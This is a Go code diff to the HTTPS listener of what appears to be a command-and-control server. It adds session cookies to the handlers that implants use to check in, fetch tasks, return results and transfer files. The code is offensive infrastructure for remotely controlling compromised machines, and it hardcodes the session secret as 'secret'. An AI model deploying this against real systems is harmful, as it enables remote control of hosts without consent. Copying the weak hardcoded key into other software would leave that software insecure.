@@ -9,6 +9,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/gin-contrib/sessions"
+	"github.com/gin-contrib/sessions/cookie"
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
@@ -53,18 +55,11 @@ type LoaderData struct {
 type SocketData struct {
 }
 
-// This function is used for verifying the connected agent.
-func verifyAgentCheckIn(ag *agent.Agent, ip string, os string, arch string, hostname string) bool {
-	if ag.Ip == ip && ag.OS == os && ag.Arch == arch && ag.Hostname == hostname {
-		return true
-	} else {
-		return false
-	}
-}
-
 func handleImplantCheckIn(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		clientIP := ctx.ClientIP()
+
+		session := sessions.Default(ctx)
 
 		// Read JSON data
 		jsonBytes, err := ctx.GetRawData()
@@ -82,19 +77,19 @@ func handleImplantCheckIn(serverState *state.ServerState) gin.HandlerFunc {
 		checkInDate := meta.GetCurrentDateTime()
 
 		// Check if the agent already exists on the database.
-		ags, err := serverState.DB.AgentGetAll()
-		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
-			return
-		}
-
-		var targetAgent *agent.Agent = nil
-		for _, ag := range ags {
-			if verifyAgentCheckIn(ag, clientIP, checkInData.OS, checkInData.Arch, checkInData.Hostname) {
-				targetAgent = ag
-				break
-			}
-		}
+		// ags, err := serverState.DB.AgentGetAll()
+		// if err != nil {
+		// 	ctx.String(http.StatusBadRequest, "")
+		// 	return
+		// }
+		// var targetAgent *agent.Agent = nil
+		// for _, ag := range ags {
+		// 	if ag.Ip == clientIP && ag.OS == checkInData.OS &&
+		// 		ag.Arch == checkInData.Arch && ag.Hostname == checkInData.Hostname {
+		// 		targetAgent = ag
+		// 		break
+		// 	}
+		// }
 
 		// Get AES key/iv
 		newAES, err := crypt.NewAESFromBase64Pairs(checkInData.AESKeyBase64, checkInData.AESIVBase64)
@@ -103,61 +98,100 @@ func handleImplantCheckIn(serverState *state.ServerState) gin.HandlerFunc {
 			return
 		}
 
-		if targetAgent == nil {
+		// if targetAgent == nil {
+		// 	// Generate a new session.
+		// 	newSessionId := utils.GenerateRandomAlphaNum(32)
 
-			// Add new agent to the database
-			targetAgent, err = agent.NewAgent(
-				0,
-				uuid.NewString(),
-				"",
-				clientIP,
-				checkInData.OS,
-				checkInData.Arch,
-				checkInData.Hostname,
-				checkInData.ListenerURL,
-				checkInData.ImplantType,
-				checkInDate,
-				checkInData.Sleep,
-				checkInData.Jitter,
-				checkInData.KillDate,
-				newAES,
-			)
-			if err != nil {
-				ctx.String(http.StatusBadRequest, "Failed to initialize target agent.")
-				return
-			}
+		// 	// Add new agent to the database
+		// 	targetAgent, err = agent.NewAgent(
+		// 		0,
+		// 		uuid.NewString(),
+		// 		"",
+		// 		clientIP,
+		// 		checkInData.OS,
+		// 		checkInData.Arch,
+		// 		checkInData.Hostname,
+		// 		checkInData.ListenerURL,
+		// 		checkInData.ImplantType,
+		// 		checkInDate,
+		// 		checkInData.Sleep,
+		// 		checkInData.Jitter,
+		// 		checkInData.KillDate,
+		// 		newAES,
+		// 		newSessionId,
+		// 	)
+		// 	if err != nil {
+		// 		ctx.String(http.StatusBadRequest, "Failed to initialize target agent.")
+		// 		return
+		// 	}
 
-			if err := serverState.DB.AgentAdd(targetAgent); err != nil {
-				ctx.String(http.StatusBadRequest, "Failed to add target agent on database.")
-				return
-			}
-		} else {
-			// Update the agent info
-			targetAgent.Hostname = checkInData.Hostname
-			targetAgent.CheckInDate = checkInDate
-			targetAgent.AES = newAES
-			if err := serverState.DB.AgentUpdate(targetAgent); err != nil {
-				ctx.String(http.StatusBadRequest, "Failed to update agent info.")
-				return
-			}
+		// 	if err := serverState.DB.AgentAdd(targetAgent); err != nil {
+		// 		ctx.String(http.StatusBadRequest, "Failed to add target agent on database.")
+		// 		return
+		// 	}
+		// } else {
+		// 	// Update the agent info
+		// 	targetAgent.Hostname = checkInData.Hostname
+		// 	targetAgent.CheckInDate = checkInDate
+		// 	targetAgent.AES = newAES
+		// 	if err := serverState.DB.AgentUpdate(targetAgent); err != nil {
+		// 		ctx.String(http.StatusBadRequest, "Failed to update agent info.")
+		// 		return
+		// 	}
+		// }
+
+		// Generate a new session and save it.
+		newSessionId := utils.GenerateRandomAlphaNum(32)
+		session.Set("session_id", newSessionId)
+		session.Save()
+
+		// Add new agent to the database
+		newAgent, err := agent.NewAgent(
+			0,
+			uuid.NewString(),
+			"",
+			clientIP,
+			checkInData.OS,
+			checkInData.Arch,
+			checkInData.Hostname,
+			checkInData.ListenerURL,
+			checkInData.ImplantType,
+			checkInDate,
+			checkInData.Sleep,
+			checkInData.Jitter,
+			checkInData.KillDate,
+			newAES,
+			newSessionId,
+		)
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "Failed to initialize target agent.")
+			return
+		}
+
+		if err := serverState.DB.AgentAdd(newAgent); err != nil {
+			ctx.String(http.StatusBadRequest, "Failed to add target agent on database.")
+			return
 		}
 
 		// Make the agent directory and others
-		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
+		err = metafs.MakeAgentChildDirs(newAgent.Name, false)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Failed to make agent child directories.")
 			return
 		}
 
-		ctx.String(http.StatusOK, targetAgent.Uuid)
+		// ctx.String(http.StatusOK, targetAgent.Uuid)
+		ctx.JSON(http.StatusOK, gin.H{"uuid": newAgent.Uuid, "session_id": newAgent.SessionId})
 	}
 	return gin.HandlerFunc(fn)
 }
 
 func handleImplantDownload(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		// Get the client UUID
-		clientUUID := ctx.GetHeader("X-UUID")
+		// Get agent UUID and session ID
+		session := sessions.Default(ctx)
+		uuid := ctx.GetHeader("X-UUID")
+		sessionID := session.Get("session_id")
 
 		// Check if the agent exists on the database
 		var targetAgent *agent.Agent = nil
@@ -167,7 +201,7 @@ func handleImplantDownload(serverState *state.ServerState) gin.HandlerFunc {
 			return
 		}
 		for _, ag := range ags {
-			if ag.Uuid == clientUUID {
+			if ag.Uuid == uuid && ag.SessionId == sessionID {
 				targetAgent = ag
 				break
 			}
@@ -221,8 +255,10 @@ func handleImplantDownload(serverState *state.ServerState) gin.HandlerFunc {
 
 func handleImplantTaskGet(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		// Get the client UUID
-		clientUUID := ctx.GetHeader("X-UUID")
+		// Get agent UUID and session ID
+		session := sessions.Default(ctx)
+		uuid := ctx.GetHeader("X-UUID")
+		sessionID := session.Get("session_id")
 
 		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
@@ -231,7 +267,7 @@ func handleImplantTaskGet(serverState *state.ServerState) gin.HandlerFunc {
 		}
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Uuid == clientUUID {
+			if ag.Uuid == uuid && ag.SessionId == sessionID {
 				targetAgent = ag
 				break
 			}
@@ -273,8 +309,10 @@ func handleImplantTaskGet(serverState *state.ServerState) gin.HandlerFunc {
 
 func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		// Get the client UUID
-		clientUUID := ctx.GetHeader("X-UUID")
+		// Get agent UUID and session ID
+		session := sessions.Default(ctx)
+		uuid := ctx.GetHeader("X-UUID")
+		sessionID := session.Get("session_id")
 
 		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
@@ -284,7 +322,7 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Uuid == clientUUID {
+			if ag.Uuid == uuid && ag.SessionId == sessionID {
 				targetAgent = ag
 				break
 			}
@@ -416,8 +454,10 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 
 func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		// Get the client UUID
-		clientUUID := ctx.GetHeader("X-UUID")
+		// Get agent UUID and session ID
+		session := sessions.Default(ctx)
+		uuid := ctx.GetHeader("X-UUID")
+		sessionID := session.Get("session_id")
 
 		// Get the agent
 		ags, err := serverState.DB.AgentGetAll()
@@ -427,7 +467,7 @@ func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 		}
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Uuid == clientUUID {
+			if ag.Uuid == uuid && ag.SessionId == sessionID {
 				targetAgent = ag
 				break
 			}
@@ -514,6 +554,11 @@ func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 }
 
 func handleImplantWebSocket(ctx *gin.Context) {
+	// Get agent UUID and session ID
+	// session := sessions.Default(ctx)
+	// uuid := ctx.GetHeader("X-UUID")
+	// sessionID := session.Get("session_id")
+
 	stdout.LogSuccess(fmt.Sprintf("Received from %s on WebSocket\n", ctx.ClientIP()))
 	w, r := ctx.Writer, ctx.Request
 	c, err := upgrader.Upgrade(w, r, nil)
@@ -726,10 +771,13 @@ func HttpsStart(
 		return err
 	}
 
+	store := cookie.NewStore([]byte("secret"))
+
 	gin.SetMode(gin.ReleaseMode)
 	router := gin.New()
 	router.HandleMethodNotAllowed = false
-	router.Use(gin.Recovery())
+	// router.Use(gin.Recovery())
+	router.Use(sessions.Sessions("mysession", store))
 
 	httpsRoutes(router, lis, serverState)
 
